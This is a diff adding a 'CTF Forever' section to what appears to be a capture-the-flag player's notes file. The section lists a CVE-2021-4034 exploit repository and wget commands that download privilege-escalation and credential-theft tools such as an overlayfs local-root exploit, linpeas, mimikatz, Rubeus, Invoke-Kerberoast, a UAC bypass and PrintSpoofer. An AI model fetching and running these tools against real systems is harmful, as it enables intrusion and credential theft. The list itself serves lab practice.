@@ -129,6 +129,23 @@ chmod a+x cjohn
 sudo mv cjohn /usr/bin/ && sudo mv cssh /usr/bin
 ```
 
+# CTF Forever
+- https://github.com/c3c/CVE-2021-4034
+```
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+wget https://raw.githubusercontent.com/riswandans/litesploit/master/modules/exploits/linux/localroot/overlayfs.c
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+```
+wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
+wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
+wget https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+wget https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
+```
+
 # No Longer Useful
 
 ### Clock Options
